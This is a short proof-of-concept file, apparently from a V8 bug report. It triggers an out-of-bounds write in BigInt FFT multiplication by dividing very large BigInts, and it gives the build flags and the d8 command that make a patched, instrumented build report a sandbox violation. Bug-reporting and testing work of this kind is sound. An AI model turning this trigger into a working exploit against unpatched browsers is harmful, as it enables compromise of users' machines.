// ============================================================================
// PoC: V8 Sandbox Bypass via NormalizeAndRecombine OOB Write (Issue 478814654)
// ============================================================================
//
// This PoC demonstrates a V8 sandbox escape via the NormalizeAndRecombine
// OOB write in BigInt FFT multiplication (src/bigint/mul-fft.cc).
//
// The v4 instrumentation patch detects when the OOB write would occur
// (zi >= Z.len()), and instead of writing to adjacent in-sandbox memory,
// writes to an address OUTSIDE the V8 sandbox. This triggers the sandbox
// violation detector when run with --sandbox-testing.
//
// BUILD REQUIREMENTS:
//   is_debug = false
//   dcheck_always_on = false
//   is_asan = true
//   target_cpu = "x64"
//   v8_enable_sandbox = true
//   v8_enable_memory_corruption_api = true
//   v8_advanced_bigint_algorithms = true
//   is_clang = true
//   use_custom_libcxx = true
//   symbol_level = 1
//
// RUN COMMAND:
//   ./d8 --sandbox-testing poc/poc_sandbox_escape.js
//
// EXPECTED OUTPUT:
//   ## V8 sandbox violation detected!
//
// ============================================================================

// Create BigInts large enough to trigger FFT multiplication.
// The FFT threshold (kFftThreshold) is 720 digits on 64-bit.
// 31337n ** 123456n produces ~28800 digits — well above threshold.
const x = 123456n;
const a = 31337n ** x;
const b = 42n ** x;

// Division triggers: DivideBurnikelZiegler -> D3n2n -> Multiply ->
// MultiplyFFT -> NormalizeAndRecombine
// The v4 instrumentation corrupts temp() on the last iteration,
// causing carry overflow at zi == Z.len(). When the OOB is detected,
// the instrumentation writes outside the sandbox, triggering the
// sandbox violation detector.
try {
  const c = a / b;
  print("Division completed (sandbox violation NOT detected)");
} catch (e) {
  print("Exception: " + e);
}
